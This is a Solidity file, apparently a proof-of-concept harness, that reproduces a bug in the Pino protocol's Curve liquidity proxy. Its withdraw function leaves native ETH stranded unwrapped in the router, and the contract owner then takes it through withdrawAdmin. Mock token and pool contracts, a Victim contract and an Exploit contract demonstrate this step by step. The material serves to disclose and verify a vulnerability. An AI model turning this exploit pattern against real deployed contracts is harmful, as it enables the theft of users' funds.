     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _i Index value of the coin to withdraw
     * @param _min Minimum amount of coin to receive
     * @return Amount of coin received
     */
    function remove_liquidity_one_coin(uint256 _amount, int128 _i, uint256 _min) external returns (uint256);
}

// ================= ICurve.sol =================


/**
 * @title Curve proxy contract interface
 * @notice Adds/Removes liquidity to Curve pools
 */
interface ICurve {
    /**
     * @notice Emitted when a token is deposited to a Curve pool
     * @param _caller Address of the caller of the transaction
     * @param _pool The address of the Curve pool
     */
    event Deposit(address _caller, address _pool);

    /**
     * @notice Emitted when a token is withdrawn from a Curve pool
     * @param _caller Address of the caller of the transaction
     * @param _pool The address of the Curve pool
     */
    event Withdraw(address _caller, address _pool);

    /**
     * @notice Adds liquidity to a pool
     * @param _amounts Amounts of the tokens in the pool to deposit
     * @param _minMintAmount Minimum amount of LP tokens to mint from the deposit
     * @param _pool Address of the pool
     * @param _proxyFeeInWei Fee of the proxy contract
     */
    function deposit(uint256[2] calldata _amounts, uint256 _minMintAmount, ICurvePool _pool, uint256 _proxyFeeInWei)
        external
        payable;

    /**
     * @notice Withdraw token from the pool
     * @param _amount Quantity of LP tokens to burn in the withdrawal
     * @param _minAmounts Minimum amounts of underlying tokens to receive
     * @param _pool Address of the pool
     */
    function withdraw(uint256 _amount, uint256[2] calldata _minAmounts, ICurvePool _pool) external payable;

    /**
     * @notice Withdraw a single token from the pool
     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _index Index value of the coin to withdraw
     * @param _minAmount Minimum amount of coin to receive
     * @param _pool Address of the pool
     * @return received Amount of token received
     */
    function withdrawOneCoinI(uint256 _amount, int128 _index, uint256 _minAmount, ICurvePool _pool)
        external
        payable
        returns (uint256 received);

    /**
     * @notice Withdraw a single token from the pool
     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _index Index value of the coin to withdraw
     * @param _minAmount Minimum amount of coin to receive
     * @param _pool Address of the pool
     * @return received Amount of token received
     */
    function withdrawOneCoinU(uint256 _amount, uint256 _index, uint256 _minAmount, ICurvePool _pool)
        external
        payable
        returns (uint256 received);
}

// ================= Curve.sol =================
/*
                                           +##*:                                          
                                         .######-                                         
                                        .########-                                        
                                        *#########.                                       
                                       :##########+                                       
                                       *###########.                                      
                                      :############=                                      
                   *###################################################.                  
                   :##################################################=                   
                    .################################################-                    
                     .*#############################################-                     
                       =##########################################*.                      
                        :########################################=                        
                          -####################################=                          
                            -################################+.                           
               =##########################################################*               
               .##########################################################-               
                .*#######################################################:                
                  =####################################################*.                 
                   .*#################################################-                   
                     -##############################################=                     
                       -##########################################=.                      
                         :+####################################*-                         
           *###################################################################:          
           =##################################################################*           
            :################################################################=            
              =############################################################*.             
               .*#########################################################-               
                 :*#####################################################-                 
                   .=################################################+:                   
                      -+##########################################*-.                     
     .+*****************###########################################################*:     
      +############################################################################*.     
       :##########################################################################=       
         -######################################################################+.        
           -##################################################################+.          
             -*#############################################################=             
               :=########################################################+:               
                  :=##################################################+-                  
                     .-+##########################################*=:                     
                         .:=*################################*+-.                         
                              .:-=+*##################*+=-:.                              
                                     .:=*#########+-.                                     
                                         .+####*:                                         
                                           .*#:    */


/**
 * @title Curve proxy contract
 * @author Pino development team
 * @notice Adds/Removes liquidity to Curve pools
 */
contract Curve is ICurve, BaseProtocolProxy {
    /**
     * @notice Receives permit2, and weth addresses
     * @param _permit2 Permit2 contract address
     * @param _weth Weth contract address
     */
    constructor(address _permit2, address _weth) payable BaseProtocolProxy(_permit2, _weth) {}

    /**
     * @notice Adds liquidity to a pool
     * @param _amounts Amounts of the tokens in the pool to deposit
     * @param _minMintAmount Minimum amount of LP tokens to mint from the deposit
     * @param _pool Address of the pool
     * @param _proxyFeeInWei Fee of the proxy contract
     */
    function deposit(uint256[2] calldata _amounts, uint256 _minMintAmount, ICurvePool _pool, uint256 _proxyFeeInWei)
        external
        payable
        nonETHReuse
    {
        _pool.add_liquidity{value: msg.value - _proxyFeeInWei}(_amounts, _minMintAmount);

        emit Deposit(msg.sender, address(_pool));
    }

    /**
     * @notice Withdraw token from the pool
     * @param _amount Quantity of LP tokens to burn in the withdrawal
     * @param _minAmounts Minimum amounts of underlying tokens to receive
     * @param _pool Address of the pool
     */
    function withdraw(uint256 _amount, uint256[2] calldata _minAmounts, ICurvePool _pool) external payable {
        _pool.remove_liquidity(_amount, _minAmounts);

        emit Withdraw(msg.sender, address(_pool));
    }

    /**
     * @notice Withdraw a single token from the pool
     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _index Index value of the token to withdraw
     * @param _minAmount Minimum amount of token to receive
     * @param _pool Address of the pool
     * @return received Amount of token received
     */
    function withdrawOneCoinI(uint256 _amount, int128 _index, uint256 _minAmount, ICurvePool _pool)
        external
        payable
        returns (uint256 received)
    {
        uint256 balanceBefore = address(this).balance;

        // remove_liquidity_one_coin may transfer ETH or ERC20
        received = _pool.remove_liquidity_one_coin(_amount, _index, _minAmount);

        uint256 balanceAfter = address(this).balance;

        if (balanceAfter > balanceBefore) {
            // Calculate the ETH received and wrap it to WETH
            weth.deposit{value: balanceAfter - balanceBefore}();
        }

        emit Withdraw(msg.sender, address(_pool));
    }

    /**
     * @notice Withdraw a single token from the pool
     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _index Index value of the coin to withdraw
     * @param _minAmount Minimum amount of coin to receive
     * @param _pool Address of the pool
     * @return received Amount of token received
     */
    function withdrawOneCoinU(uint256 _amount, uint256 _index, uint256 _minAmount, ICurvePool _pool)
        external
        payable
        returns (uint256 received)
    {
        uint256 balanceBefore = address(this).balance;

        // remove_liquidity_one_coin may transfer ETH or ERC20
        received = _pool.remove_liquidity_one_coin(_amount, _index, _minAmount);

        uint256 balanceAfter = address(this).balance;

        if (balanceAfter > balanceBefore) {
            // Calculate the ETH received and wrap it to WETH
            weth.deposit{value: balanceAfter - balanceBefore}();
        }

        emit Withdraw(msg.sender, address(_pool));
    }
}

// ================= MockVenue.sol =================


/// @notice Minimal real ERC20 used as an opaque pool coin (e.g. stETH-like) and LP token.
contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        emit Approval(msg.sender, s, a);
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _transfer(msg.sender, to, a);
        return true;
    }

    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        _transfer(from, to, a);
        return true;
    }

    function _transfer(address from, address to, uint256 a) internal {
        balanceOf[from] -= a;
        balanceOf[to] += a;
        emit Transfer(from, to, a);
    }

    function mint(address to, uint256 a) external {
        totalSupply += a;
        balanceOf[to] += a;
        emit Transfer(address(0), to, a);
    }

    function burn(address from, uint256 a) external {
        balanceOf[from] -= a;
        totalSupply -= a;
        emit Transfer(from, address(0), a);
    }
}

/// @notice Minimal real WETH9 (deposit/withdraw), matches Pino's IWETH9 usage.
contract MockWETH9 {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);
    event Transfer(address indexed src, address indexed dst, uint256 wad);
    event Approval(address indexed src, address indexed guy, uint256 wad);

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external {
        balanceOf[msg.sender] -= wad;
        (bool ok,) = msg.sender.call{value: wad}("");
        require(ok, "WETH: send fail");
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() external view returns (uint256) {
        return address(this).balance;
    }

    function approve(address guy, uint256 wad) external returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint256 wad) external returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {
        require(balanceOf[src] >= wad, "WETH: bal");
        if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
            allowance[src][msg.sender] -= wad;
        }
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;
        emit Transfer(src, dst, wad);
        return true;
    }
}

/// @notice Minimal Curve-style 2-coin pool where coin0 is native ETH and coin1 is an ERC20.
/// @dev This is the opaque external venue. On remove_liquidity it returns coin0 as NATIVE ETH
///      to the caller (exactly like real Curve ETH pools, e.g. the stETH pool), which is the
///      precondition that the Pino `Curve.withdraw` bug mishandles.
///      The pool contract itself is the LP token (like many real Curve pools).
contract MockCurveEthPool {
    uint8 public constant ETH_INDEX = 0; // coin0 = ETH (native)
    IERC20 public immutable coin1; // coin1 = stETH-like ERC20

    // LP accounting (this contract acts as the LP token)
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // reserves
    uint256 public tokenReserve; // coin1 reserve

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(IERC20 _coin1) {
        coin1 = _coin1;
    }

    receive() external payable {}

    function coins(uint256 i) external view returns (address) {
        return i == 0 ? address(0) : address(coin1);
    }

    /// @notice Deposit [ethAmount, tokenAmount]; mints LP = sum of deposited value.
    function add_liquidity(uint256[2] calldata _amounts, uint256 _min_mint_amount) external payable {
        require(msg.value == _amounts[0], "eth mismatch");
        if (_amounts[1] > 0) {
            require(coin1.transferFrom(msg.sender, address(this), _amounts[1]), "pull coin1");
            tokenReserve += _amounts[1];
        }
        uint256 minted = _amounts[0] + _amounts[1];
        require(minted >= _min_mint_amount, "slippage");
        totalSupply += minted;
        balanceOf[msg.sender] += minted;
        emit Transfer(address(0), msg.sender, minted);
    }

    /// @notice Burn LP, receive proportional coin0 (ETH, native) and coin1 (ERC20).
    function remove_liquidity(uint256 _amount, uint256[2] calldata _min_amounts) external {
        uint256 supply = totalSupply;
        uint256 ethOut = (address(this).balance * _amount) / supply;
        uint256 tokenOut = (tokenReserve * _amount) / supply;
        require(ethOut >= _min_amounts[0] && tokenOut >= _min_amounts[1], "slippage");

        balanceOf[msg.sender] -= _amount;
        totalSupply -= _amount;
        tokenReserve -= tokenOut;
        emit Transfer(msg.sender, address(0), _amount);

        if (tokenOut > 0) require(coin1.transfer(msg.sender, tokenOut), "send coin1");
        if (ethOut > 0) {
            (bool ok,) = msg.sender.call{value: ethOut}(""); // NATIVE ETH back to caller
            require(ok, "send eth");
        }
    }

    function remove_liquidity_one_coin(uint256 _amount, uint256 _i, uint256 _min) public returns (uint256 out) {
        balanceOf[msg.sender] -= _amount;
        totalSupply -= _amount;
        if (_i == 0) {
            out = _amount; // 1:1 for simplicity
            require(out >= _min, "slippage");
            (bool ok,) = msg.sender.call{value: out}(""); // NATIVE ETH back to caller
            require(ok, "send eth");
        } else {
            out = _amount;
            require(out >= _min, "slippage");
            tokenReserve -= out;
            require(coin1.transfer(msg.sender, out), "send coin1");
        }
    }

    function remove_liquidity_one_coin(uint256 _amount, int128 _i, uint256 _min) external returns (uint256) {
        return remove_liquidity_one_coin(_amount, uint256(uint128(_i)), _min);
    }
}

// ================= Victim (independent user) =================
/// @notice An independent user who supplies ETH liquidity through Pino and then
///         withdraws it. Pre-funded with 1 ETH (setup step, outside the profit
///         window) so the ETH the attacker captures is genuinely the victim's.
contract Victim {
    receive() external payable {}

    function provision(Curve router, ICurvePool pool, uint256 ethAmount) external {
        uint256[2] memory amounts = [ethAmount, uint256(0)]; // [ETH, stETH]
        router.deposit{value: ethAmount}(amounts, 0, pool, 0);
    }

    function tryExit(Curve router, ICurvePool pool, uint256 lp) external {
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        router.withdraw(lp, minAmounts, pool);   // VULN: native ETH returned to router, never wrapped
        router.unwrapWETH9(address(this));        // user's only ETH exit -> recovers 0 (router holds 0 WETH)
    }
}

// ================= Exploit =================
/// @notice Deploys the real Pino Curve router (so this contract == owner) and the
///         opaque ETH pool, then drives the victim through deposit + withdraw and
///         captures the stranded ETH as the owner via withdrawAdmin.
contract Exploit {
    uint256 public constant ONE_ETH = 1 ether;

    Victim public victim;
    Curve public router;
    MockCurveEthPool public pool;
    MockWETH9 public weth;
    MockERC20 public steth;
    uint256 public strandedCaptured;

    constructor(address _victim) {
        victim = Victim(payable(_victim));
        weth = new MockWETH9();
        steth = new MockERC20("Staked ETH", "stETH");
        pool = new MockCurveEthPool(steth);
        router = new Curve(address(0xDEAD), address(weth)); // deployer (this) becomes the Pino owner
    }

    receive() external payable {}

    function run() external {
        ICurvePool p = ICurvePool(address(pool));

        // 1) Victim (pre-funded with 1 ETH) supplies liquidity via the real Pino router.
        victim.provision(router, p, ONE_ETH);
        require(pool.balanceOf(address(router)) == ONE_ETH, "router should hold LP");

        // 2) Victim withdraws. remove_liquidity returns 1 ETH as NATIVE ETH to the
        //    router; `withdraw` never wraps it, and unwrapWETH9 finds 0 WETH -> stranded.
        victim.tryExit(router, p, ONE_ETH);
        require(address(victim).balance == 0, "victim unexpectedly recovered ETH");
        require(address(router).balance == ONE_ETH, "1 ETH not stranded in router");
        require(weth.balanceOf(address(router)) == 0, "withdraw unexpectedly wrapped ETH");

        // 3) The Pino owner (this contract) captures the stranded ETH for itself.
        router.withdrawAdmin(address(this));
        strandedCaptured = address(this).balance;
        require(strandedCaptured == ONE_ETH, "owner did not capture the stranded 1 ETH");
    }
}
